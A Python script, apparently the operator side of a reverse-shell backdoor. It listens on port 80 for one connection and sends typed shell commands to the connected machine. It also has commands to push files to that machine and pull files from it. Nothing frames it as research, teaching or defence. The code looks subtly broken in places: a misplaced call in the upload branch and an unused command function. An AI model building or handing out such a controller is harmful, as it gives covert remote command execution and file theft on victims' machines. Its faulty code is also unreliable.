import socket
import subprocess
import os
import base64

def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except Exception as e:
        return str(e)

def upload_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            content = file.read()
            return content
    except Exception as e:
        return str(e)

def download_file(file_name, file_content):
    try:
        with open(file_name, 'wb') as file:
            file.write(base64.b64decode(file_content))
        return f"File downloaded successfully: {file_name}"
    except Exception as e:
        return str(e)

def main():
    host = '0.0.0.0'  # Listen on all available interfaces
    port = 80

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        server.bind((host, port))
        server.listen(1)  # Listen for only one connection

        print(f"[*] Listening on {host}:{port}")

        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from: {addr}")

        while True:
            command = input("Shell> ")
            client_socket.send(f"SHELL_COMMAND:{command}".encode('utf-8'))

            if command.lower() == 'exit':
                break

            if 'upload' in command:
                file_path = command.split()[1]
                file_content = upload_file(file_path)
                client_socket.send(f"SHELL_COMMAND:upload|{os.path.basename(file_path)}|{base64.b64encode(file_content).decode('utf-8')}").encode('utf-8')
            elif 'download' in command:
                file_name = command.split()[1]
                client_socket.send(f"SHELL_COMMAND:download|{file_name}".encode('utf-8'))
                file_content = client_socket.recv(1024).decode('utf-8')
                result = download_file(file_name, file_content)
            else:
                result = client_socket.recv(1024).decode('utf-8')

            print(result)
    finally:
        server.close()

if __name__ == "__main__":
    main()
